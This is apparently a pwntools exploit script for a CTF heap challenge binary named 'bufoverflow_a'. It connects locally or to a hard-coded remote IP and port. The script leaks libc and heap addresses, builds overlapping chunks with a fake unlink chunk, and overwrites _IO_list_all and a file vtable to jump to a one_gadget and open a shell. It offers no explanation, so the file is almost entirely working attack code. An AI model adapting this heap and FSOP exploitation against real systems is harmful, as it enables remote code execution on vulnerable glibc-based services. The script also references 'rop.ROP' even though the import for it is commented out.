from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./bufoverflow_a"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)
f_script = open('./script','rb')

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,gdbscript = f_script)


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def Alloc(size):
	sla('>> ','1')
	sla('Size: ',str(size))

def Delete(idx):
	sla('>> ','2')
	sla('Index: ',str(idx))

def Fill(content):
	sla('>> ','3')
	sla('Content: ',content)

def Show():
	sla('>> ','4')

def hack():
	raw_input()
	
	#step 1: leak libc information
	Alloc(0x100)	#0
	Alloc(0x80)		#1
	Delete(0)
	Alloc(0x100)	#0
	Show()
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg("top_addr",top_addr)
	libc.address = top_addr - 0x58 - 0x399B00
	lg("libc.address",libc.address)
	system_addr = libc.symbols['system']
	lg('system_addr',system_addr)
	Delete(0)
	Delete(1)

	#step 2: leak heap address
	Alloc(0x100)	#0
	Alloc(0x100)	#1
	Alloc(0x200)	#2
	Alloc(0x100)	#3

	Delete(0)
	Delete(2)
	Delete(3)

	Alloc(0x200)	#0
	Show()
	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
	lg('heap_addr',heap_addr)

	Delete(0)
	Delete(1)

	#step 3: build overlap chunk
	Alloc(0x100)	#0
	Alloc(0x108)	#1
	Alloc(0xf0)		#2
	Alloc(0x100)	#3

	Delete(1)
	Alloc(0x108)	#1

	fake_fd = heap_addr - 0x18 + 0x18
	fake_bk = heap_addr - 0x10 + 0x18

	payload = p64(0) + p64(0x101) + p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x100,'\x00')
	payload += p64(0x100)
	Fill(payload)

	Delete(2)

	Alloc(0x1f0)	#2

	payload = p64(0x21)*0x3e
	Fill(payload)

	Delete(1)
	Delete(0)
	Alloc(0x210)	#0
	payload = '\x00'*0x110 + p64(0) + p64(0x91) + p64(0x21)*30
	Fill(payload)

	Delete(3)
	Delete(2)
	Alloc(0x88)		#1

	Delete(0)
	Delete(1)

	Alloc(0x210)
	_IO_list_all = libc.symbols['_IO_list_all']
	jump_table_addr = libc.symbols['_IO_file_jumps'] + 0xc0
	one_gadget = libc.address + 0x3f52a
	payload = p64(0)*34 + p64(0) + p64(0x61) + p64(0) + p64(_IO_list_all-0x10) + p64(2) + p64(3)
	payload += (0xd8 - 6*8) * '\x00'
	payload += p64(jump_table_addr)
	payload += p64(one_gadget)
	Fill(payload)
	
	sla('>> ','1')
	sla('Size: ',str(0x80))
	p.interactive()
hack()